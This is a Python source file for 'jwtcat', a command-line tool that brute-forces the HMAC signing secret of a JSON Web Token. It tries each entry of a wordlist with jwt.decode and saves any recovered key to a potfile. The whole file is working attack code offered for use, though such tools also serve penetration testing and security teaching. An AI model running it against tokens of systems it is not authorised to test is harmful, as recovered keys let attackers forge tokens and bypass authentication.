#!/usr/bin/env python3
#    Copyright (C) 2017 Alexandre Teyar

# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at

# http://www.apache.org/licenses/LICENSE-2.0

# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
#    limitations under the License.

import argparse
from datetime import datetime, timedelta
import colorlog
import jwt
import logging
import os
import signal
import sys
import time

formatter = colorlog.ColoredFormatter(
    "%(log_color)s[%(levelname)s] %(message)s%(reset)s",
    reset = True,
    log_colors = {
        'DEBUG':    'cyan',
        'INFO':     'green',
        'WARNING':  'yellow',
        'ERROR':    'red',
        'CRITICAL': 'red, bg_white',
    }
)
handler = colorlog.StreamHandler()
handler.setFormatter(formatter)
logger = colorlog.getLogger("jwtcatLog")
logger.addHandler(handler)

def parse_args():
    """ Parse and validate user's command line
    """
    parser = argparse.ArgumentParser(
        description = "JSON Web Token brute-forcer"
    )

    parser.add_argument(
        "-t", "--token", 
        dest = "token", 
        help = "JSON Web Token", 
        required = True, 
        type = str
    )

    parser.add_argument(
        "-v", "--verbose",
        dest = "loglevel",
        help = "enable verbose",
        required = False,
        action = "store_const", 
        const = logging.DEBUG,
        default = logging.INFO
    )

    # Set the UTF-8 encoding and ignore error mode to avoid issues with the wordlist
    parser.add_argument(
        "-w", "--wordlist", 
        dest = "wordlist", 
        help = "wordlist containing the passwords", 
        required = True, 
        type = argparse.FileType(
            'r', 
            encoding = 'UTF-8', 
            errors = 'ignore'
        )
    )
 
    return parser.parse_args()

def run(token, word):
    """ Check if [word] can decrypt [token]
    """
    try:
        payload = jwt.decode(token, word, algorithm = 'HS256')
        return True

    except jwt.exceptions.InvalidTokenError:
        logger.debug("InvalidTokenError: {}".format(word))
        return False
    except jwt.exceptions.DecodeError:
        logger.debug("DecodingError: {}".format(word))
        return False
    except Exception as ex:
        logger.exception("Exception: {}".format(ex))
        sys.exit(1)

def main():
    try:
        args = parse_args()
        logger.setLevel(args.loglevel)

        token = args.token
        wordlist = args.wordlist

        logger.info("JWT: {}".format(token))
        logger.info("Wordlist: {}".format(wordlist.name))
        logger.info("Starting brute-force attacks")
        logger.warn("Pour yourself some coffee, this might take a while..." )

        start_time = time.time()

        for entry in wordlist:
            word = entry.rstrip()
            result = run(token, word)

            if result:
                logger.info("Secret key: {}".format(word))

                # Save the holy secret into a file in case sys.stdout is not responding
                with open("jwtpot.potfile", "a+") as file:
                    file.write("{0}:{1}".format(token, word))
                    logger.info("Secret key saved to location: {}".format(file.name))

                break

        end_time = time.time()
        elapsed_time = end_time - start_time
        logger.info("Finished in {} sec".format(elapsed_time))

    except KeyboardInterrupt:
        logger.error("CTRL+C pressed, exiting...")

        wordlist.close()

        elapsed_time = time.time() - start_time
        logger.info("Interrupted after {} sec".format(elapsed_time))

if __name__ == "__main__":
    main()